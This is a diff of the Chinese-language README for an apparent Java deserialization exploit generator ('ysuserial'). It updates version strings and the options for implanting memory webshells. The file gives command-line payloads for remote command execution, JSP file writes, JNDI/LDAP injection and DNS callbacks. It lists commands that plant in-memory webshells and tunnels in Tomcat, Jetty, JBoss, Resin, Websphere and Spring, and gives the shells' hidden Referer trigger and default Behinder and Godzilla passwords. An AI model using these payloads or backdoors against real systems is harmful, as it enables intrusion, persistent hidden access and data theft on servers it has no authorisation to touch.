@@ -27,7 +27,7 @@
 
 
 ```text
-$ java -jar ysuserial-0.3-su18-all.jar
+$ java -jar ysuserial-0.4-su18-all.jar
             _.-^^---....,,--
        _--                  --_
       <                        >)
@@ -44,7 +44,7 @@ $ java -jar ysuserial-0.3-su18-all.jar
 [root]#~  A Mind-Blowing Tool Collected By [ su18@javaweb.org ]
 [root]#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei
 [root]#~  AND OF COURSE TO THE All MIGHTY @frohoff  
-[root]#~  Usage: java -jar ysuserial-0.3-su18-all.jar [payload] '[command]'
+[root]#~  Usage: java -jar ysuserial-0.4-su18-all.jar [payload] '[command]'
 [root]#~  Available payload types:
 Jun 19, 2022 11:54:53 PM org.reflections.Reflections scan
 INFO: Reflections took 195 ms to scan 1 urls, producing 26 keys and 230 values 
@@ -137,7 +137,7 @@ INFO: Reflections took 195 ms to scan 1 urls, producing 26 keys and 230 values
 **命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
+java -jar ysuserial-0.4-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
 ```
 
 
@@ -149,7 +149,7 @@ java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxj
 **DNSLOG示例**：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'DL-xxx.org'
+java -jar ysuserial-0.4-su18-all.jar CommonsCollections1 'DL-xxx.org'
 ```
 
 
@@ -161,7 +161,7 @@ java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'DL-xxx.org'
 **脚本引擎解析 JS 代码示例**：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.4-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 
@@ -175,7 +175,7 @@ java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWx
 **文件写入示例**：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
+java -jar ysuserial-0.4-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
 ```
 
 
@@ -187,7 +187,7 @@ java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFn
 **触发 JNDI 查询注入示例**：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.4-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 
@@ -199,7 +199,7 @@ java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:13
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsCollections1 'open -a Calculator.app'
+java -jar ysuserial-0.4-su18-all.jar CommonsCollections1 'open -a Calculator.app'
 ```
 
 
@@ -229,19 +229,19 @@ Tomcat Listener NeoReg 流量隧道：
 - 命令 `EX-TLNeoRegFromThread`：通过线程类加载器获取指定上下文向系统内植入 NeoReg 流量隧道型内存马
 
 内存马：
-- 命令 `EX-MS-SpringInterceptorMS`：向系统内植入 Spring 拦截器类型的内存马
-- 命令 `EX-MS-TFMSFromJMX`：利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
-- 命令 `EX-MS-TFMSFromThread`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
-- 命令 `EX-MS-TLMSFromThread`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
-- 命令 `EX-MS-TSMSFromJMX`：利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
-- 命令 `EX-MS-TSMSFromThread`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
-- 命令 `EX-MS-JBFMSFromContext`：通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
-- 命令 `EX-MS-JBSMSFromContext`：通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
-- 命令 `EX-MS-JFMSFromJMX`：利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
-- 命令 `EX-MS-JSMSFromJMX`：利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
-- 命令 `EX-MS-RFMSFromThread`：通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
-- 命令 `EX-MS-RSMSFromThread`：通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
-- 命令 `EX-MS-WSFMSFromThread`：通过线程类加载器获取指定上下文系统内植入 Websphere Filter 型内存马
+- 命令 `EX-MS-SpringInterceptorMS-...`：向系统内植入 Spring 拦截器类型的内存马
+- 命令 `EX-MS-TFMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
+- 命令 `EX-MS-TFMSFromThread-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
+- 命令 `EX-MS-TLMSFromThread-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
+- 命令 `EX-MS-TSMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
+- 命令 `EX-MS-TSMSFromThread-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
+- 命令 `EX-MS-JBFMSFromContext-...`：通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
+- 命令 `EX-MS-JBSMSFromContext-...`：通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
+- 命令 `EX-MS-JFMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
+- 命令 `EX-MS-JSMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
+- 命令 `EX-MS-RFMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
+- 命令 `EX-MS-RSMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
+- 命令 `EX-MS-WSFMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Websphere Filter 型内存马
 
 目前支持的直打内存马的类型包括 Tomcat、Jetty、JBoss/Wildfly、Websphere、Resin、Spring，还有以下几个暂未支持：
 - GlassFish 内嵌了 Tomcat，实现类似，稍微改改即可；
@@ -249,6 +249,12 @@ Tomcat Listener NeoReg 流量隧道：
 - BES ≈ Tomcat，改包名；
 - InforSuite ≈ Tomcat，改包名；
 - Weblogic 还未实现，后续版本随着 Weblogic 的反序列化 payload 一起添加。
+
+并可以通过关键字指定内存马的类型，如冰蝎内存马、哥斯拉 Base64 内存马、哥斯拉 RAW 内存马、CMD 命令回显马等，使用方法例子如下：
+- `EX-MS-TSMSFromThread-bx`：`冰蝎` 逻辑内存马
+- `EX-MS-TSMSFromThread-gz`：`哥斯拉` Base64 逻辑内存马
+- `EX-MS-TSMSFromThread-gzraw`：`哥斯拉` RAW 逻辑内存马
+- `EX-MS-TSMSFromThread-cmd`：`CMD` 命令回显内存马
 
 本工具支持的全部内存马经过测试可用，但实际受到中间件版本的限制，对于内存马的相关测试，可以参考项目 [https://github.com/su18/MemoryShell](https://github.com/su18/MemoryShell)
 
@@ -265,7 +271,7 @@ Tomcat Listener NeoReg 流量隧道：
 示例：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
+java -jar ysuserial-0.4-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
 ```
 
 
@@ -285,7 +291,7 @@ java -jar ysuserial-0.3-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
+java -jar ysuserial-0.4-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
 ```
 
 
@@ -327,7 +333,7 @@ java -jar ysuserial-0.3-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
 示例：`all:xxxxxx.dns.log`
 
 ```shell
-java -jar ysuserial-0.3-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
+java -jar ysuserial-0.4-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
 ```
 
 
@@ -369,20 +375,16 @@ java -jar ysuserial-0.3-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
 
 ## 命令执行及后门类
 
-对于 SpringInterceptorMS、TFMSFromJMX、TFMSFromThread、TLMSFromJMX、TLMSFromThread、TSMSFromJMX、TSMSFromThread 注入内存马的利用方式，此类内存马都同时集成了三种功能：命令执行及回显、冰蝎、哥斯拉。
+对于植入的内存马及恶意逻辑，首先为了隐藏内存马，通过逻辑进行了判断，需要在请求 Header 中添加 `Referer: https://su18.org/`，其次执行不同的逻辑：
 
-首先为了隐藏内存马，通过逻辑进行了判断，需要在请求 Header 中添加 `Referer: https://su18.org/`。
-
-其次将根据 header 中的 `X-SSRF-TOKEN` 的值执行不同的逻辑：
-
-1. 如果 `X-SSRF-TOKEN` 的值是 ce，则为 <font color="orange">命令执行</font> 功能，程序会从 `X-Token-Data` 中读取待执行的命令，并将执行结果进行回显；
+1. 如果是 <font color="orange">CMD</font> 内存马，程序会从 `X-Token-Data` 中读取待执行的命令，并将执行结果进行回显；
    ![image-20220618232343999](images/image-20220618232343999.png)
 
-2. 如果 `X-SSRF-TOKEN` 的值是 bx，则为 <font color="orange">冰蝎 Shell</font> 功能，可使用冰蝎客户端进行连接管理，密码 `su18yyds`；
+2. 如果是 <font color="orange">冰蝎 Shell</font> 内存马，可使用冰蝎客户端进行连接管理，密码 `su18yyds`；
 
    ![image-20220618233227870](images/image-20220618233227870.png)
 
-3. 如果 `X-SSRF-TOKEN` 的值是 gz，则为 <font color="orange">哥斯拉 shell</font> 功能，可使用哥斯拉客户端进行连接管理，pass 值设为 `su18`，key 设为 `su18yyds`。
+3. 如果是 <font color="orange">哥斯拉 shell</font> 内存马，可使用哥斯拉客户端进行连接管理，pass 值设为 `su18`，key 设为 `su18yyds`，哥斯拉内存马同时支持了 RAW 和 Base64。
 
    ![image-20220618232717600](images/image-20220618232717600.png)
 
